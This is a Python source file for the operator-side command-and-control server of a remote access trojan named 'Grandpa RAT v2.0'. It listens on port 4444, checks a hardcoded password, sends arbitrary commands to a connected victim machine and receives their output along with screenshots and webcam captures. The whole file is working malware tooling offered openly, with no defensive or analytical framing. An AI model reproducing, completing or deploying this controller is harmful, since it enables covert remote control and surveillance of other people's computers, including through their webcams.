import socket
import threading
import os

PASSWORD = "grandpa123"

def banner():
    print(r"""
 ██████╗ ██████╗  █████╗ ███╗   ██╗██████╗  █████╗       ██████╗  █████╗ ████████╗
██╔════╝ ██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗      ██╔══██╗██╔══██╗╚══██╔══╝
██║  ███╗██████╔╝███████║██╔██╗ ██║██████╔╝███████║█████╗██████╔╝███████║   ██║   
██║   ██║██╔═══╝ ██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║╚════╝██╔═══╝ ██╔══██║   ██║   
╚██████╔╝██║     ██║  ██║██║ ╚████║██║     ██║  ██║      ██║     ██║  ██║   ██║   
 ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝      ╚═╝     ╚═╝  ╚═╝   ╚═╝   
    """)
    print("👴 Grandpa RAT v2.0 - Waiting for connection...\n")

def handle_client(conn, addr):
    print(f"[+] Connection from {addr}")

    received_pass = conn.recv(1024).decode()
    if received_pass != PASSWORD:
        conn.send(b"FAIL")
        conn.close()
        return
    conn.send(b"OK")

    while True:
        command = input("GrandpaRAT> ")
        conn.send(command.encode())

        if command == "exit":
            break
        elif command in ["screenshot", "webcam"]:
            with open(f"{command}.jpg" if command == "webcam" else "screen.png", "wb") as f:
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    f.write(data)
            print(f"[+] {command.capitalize()} saved.")
        else:
            result = conn.recv(4096).decode(errors='ignore')
            print(result)

    conn.close()

def main():
    banner()
    server = socket.socket()
    server.bind(('0.0.0.0', 4444))
    server.listen(1)
    conn, addr = server.accept()
    handle_client(conn, addr)

if __name__ == "__main__":
    main()